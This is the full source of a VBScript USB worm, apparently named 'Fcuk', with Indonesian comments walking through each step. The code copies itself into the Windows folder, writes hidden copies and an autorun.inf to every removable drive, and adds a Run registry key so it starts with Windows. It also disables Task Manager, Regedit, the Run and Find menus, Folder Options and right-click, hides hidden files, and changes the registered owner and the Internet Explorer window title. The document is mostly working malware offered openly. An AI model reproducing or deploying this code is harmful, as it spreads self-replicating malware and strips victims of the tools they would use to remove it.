'//--Awal dari kode, set agar ketika terjadi Error dibiarkan dan kemudian lanjutkan kegiatan virus--//

 

 

on error resume next

 

 

 

'//--Dim kata-kata berikut ini--//

dim rekur,windowpath,flashdrive,fs,mf,isi,tf,fcuk,nt,check,sd

 

 

 

'//--Set sebuah teks yang nantinya akan dibuat untuk Autorun Setup Information-//

isi = "[autorun]" & vbcrlf & "shellexecute=wscript.exe fcuk.dll.vbs"

set fs = createobject("Scripting.FileSystemObject")

set mf = fs.getfile(Wscript.ScriptFullname)

dim text,size

size = mf.size

check = mf.drive.drivetype

set text = mf.openastextstream(1,-2)

do while not text.atendofstream

rekur = rekur & text.readline

rekur = rekur & vbcrlf

loop

do

 

 

 

'//--Copy diri untuk menjadi file induk di Windows Path (example: C:\Windows)

 

 

Set windowpath = fs.getspecialfolder(0)

set tf = fs.getfile(windowpath & "\fcuk-x.dll.vbs")

tf.attributes = 32

set tf=fs.createtextfile(windowpath & "\fcuk-x.dll.vbs",2,true)

tf.write rekur

tf.close

set tf = fs.getfile(windowpath & "\fcuk-x.dll.vbs")

tf.attributes = 39

 

 

'//--Buat Atorun.inf untuk menjalankan virus otomatis setiap flash disc tercolok--//

‘Menyebar ke setiap drive yang bertype 1 dan 2(removable) termasuk disket

 

 

 

for each flashdrive in fs.drives

 

 

'//--Cek Drive--//

If (flashdrive.drivetype = 1 or flashdrive.drivetype = 2) and flashdrive.path <> "A:" then

 

 

 

'//--Buat Infector jika ternyata Drivetypr 1 atau 2. Atau A:\--//

set tf=fs.getfile(flashdrive.path &"\fcuk.dll.vbs ")

tf.attributes =32

set tf=fs.createtextfile(flashdrive.path &"\fcuk.dll.vbs ",2,true)

tf.write reku

tf.close

set tf=fs.getfile(flashdrive.path &"\fcuk.dll.vbs ")

tf.attributes = 39

 

 

 

'//--Buat Atorun.inf yang teks-nya tadi sudah disiapkan (Auto Setup Information)--//

set tf =fs.getfile(flashdrive.path &"\autorun.inf")

tf.attributes = 32

set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)

tf.write isi

tf.close

set tf = fs.getfile(flashdrive.path &"\autorun.inf")

tf.attributes=39

end if

next

 

 

 

'//--Manipulasi Registry--//

 

set fcuk = createobject("WScript.Shell")

 

 

 

'//--Manip - Ubah Title Internet Explorer menjadi THE FCUK v.s. SCUK--//

fcuk.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title"," THE FCUK v.s. SCUK "

 

 

 

'//--Manip – Set agar file hidden tidak ditampilkan di Explorer--//

fcuk.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Advanced\Hidden", "0",

"REG_DWORD"

 

'//--Manip – Hilangkan menu Find, Folder Options, Run, dan memblokir Regedit dan Task Manager--//

fcuk.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", "1",

"REG_DWORD"

fcuk.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions", "1",

"REG_DWORD"

fcuk.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", "1",

"REG_DWORD"

fcuk.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1",

"REG_DWORD"

fcuk.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1",

"REG_DWORD"

 

'//--Manip – Disable klik kanan--//

fcuk.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu",

"1", "REG_DWORD"

 

'//--Manip - Munculkan Pesan Setiap Windows Startup--//

fcuk.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption", "THE

FCUKERS "

 

fcuk.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText", "Worm

Fcuk. Variant from Fcuk-Scuk, don’t panic all data are safe."

 

'//--Manip – Aktif setiap Windows Startup--//

fcuk.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Systemdir", windowpath &

"\fcuk-x.dll.vbs"

 

'//--Manip – Ubah RegisteredOwner dan Organization--//

fcuk.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "The

Fcuk"

fcuk.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","fcuk"

 

'//--Tambahan

if check <> 1 then

Wscript.sleep 200000

end if

loop while check <> 1

set sd = createobject("Wscript.shell")

sd.run windowpath & "\explorer.exe /e,/select, " & Wscript.ScriptFullname

 

 

'Akhir dari Kode